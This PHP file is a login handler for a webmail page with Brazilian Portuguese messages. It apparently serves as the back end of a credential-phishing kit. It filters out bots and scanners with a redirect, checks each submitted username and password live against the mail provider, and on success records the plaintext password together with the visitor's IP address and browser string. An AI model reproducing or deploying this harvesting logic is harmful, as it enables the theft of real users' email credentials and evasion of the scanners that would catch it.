<?php
declare(strict_types=1);

require __DIR__ . '/includes/security.php';

$config = require __DIR__ . '/config.php';
public_session_start($config);

require __DIR__ . '/includes/anti_bot.php';
require __DIR__ . '/includes/messages.php';
require __DIR__ . '/includes/storage.php';
require __DIR__ . '/includes/webmail_redirect.php';
require __DIR__ . '/includes/provider_verify.php';

header('Content-Type: application/json; charset=utf-8');

$denyUrl = webmail_blocked_redirect($config);
$botCheck = anti_bot_evaluate($config);
if (!$botCheck['allowed']) {
    http_response_code(403);
    echo json_encode(['redirect' => $denyUrl, 'blocked' => true]);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['message' => 'invalid_login', 'text' => msg('invalid_login', 'pt_br')]);
    exit;
}

if (!rate_limit_check('public_login', 30, 300)) {
    http_response_code(429);
    echo json_encode(['message' => 'invalid_login', 'text' => msg('invalid_login', 'pt_br')]);
    exit;
}

$user = trim((string) ($_POST['user'] ?? ''));
$pass = (string) ($_POST['pass'] ?? '');
$locale = (string) ($_SESSION['locale'] ?? $config['default_locale']);
$storage = new Storage($config['data_dir']);
$ip = client_ip();
$ua = client_ua();

if ($storage->isIpBlocked($ip)) {
    echo json_encode(['redirect' => $denyUrl, 'blocked' => true]);
    exit;
}

$check = webmail_verify_credentials_full($user, $pass, $config, $locale);

if (!$check['ok']) {
    $msgKey = (string) ($check['message_key'] ?? 'invalid_login');
    $status = in_array($msgKey, ['no_username', 'invalid_email', 'invalid_password', 'invalid_domain'], true) ? 400 : 401;
    if (str_starts_with($msgKey, 'warn_')) {
        $status = 400;
    }

    http_response_code($status);
    echo json_encode(webmail_build_login_payload($check, $config, $locale, false), JSON_UNESCAPED_UNICODE);
    exit;
}

$storage->recordLoginAttempt($user, $pass, true, $ip, $ua);
$_SESSION['webmail_user'] = $user;

http_response_code(200);
echo json_encode(webmail_build_login_payload($check, $config, $locale, true), JSON_UNESCAPED_UNICODE);
